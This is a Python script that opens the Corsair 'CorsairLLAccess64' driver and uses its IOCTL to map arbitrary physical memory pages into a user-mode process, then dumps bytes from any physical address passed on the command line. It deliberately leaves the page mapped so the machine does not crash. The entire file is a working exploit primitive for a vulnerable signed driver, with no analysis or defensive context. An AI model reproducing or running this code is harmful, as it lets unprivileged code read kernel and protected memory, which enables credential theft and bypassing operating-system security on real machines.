
import ctypes
import struct
import sys

IOCTL_MAP_PHYS_MEM = 0x00225374
PAGE_SIZE = 0x1000
kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)

def surgical_read(pa):
    h = kernel32.CreateFileW(r"\\.\CorsairLLAccess64", 0xC0000000, 7, None, 3, 0x80, None)
    if h == -1:
        print("[-] Driver not open")
        return

    print(f"[*] Attempting surgical read of PA 0x{pa:X}...")
    
    # 1. Map ONE page
    inp = struct.pack("<QII", pa & ~0xFFF, PAGE_SIZE, 0)
    out = ctypes.c_uint64(0)
    ret = ctypes.c_uint32(0)
    
    ok = kernel32.DeviceIoControl(h, IOCTL_MAP_PHYS_MEM, inp, 16, ctypes.byref(out), 8, ctypes.byref(ret), None)
    
    if ok and out.value:
        # 2. Read 32 bytes
        off = pa & 0xFFF
        data = bytes((ctypes.c_ubyte * 32).from_address(out.value + off))
        print(f"[+] Data at 0x{pa:X}: {data.hex(' ')}")
        
        # 3. DO NOT UNMAP (to avoid the 0x4E bug)
        # We just close the handle.
    else:
        print(f"[-] Map failed. Error: {ctypes.get_last_error()}")
    
    kernel32.CloseHandle(h)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python safe_read.py <hex_pa>")
    else:
        surgical_read(int(sys.argv[1], 16))
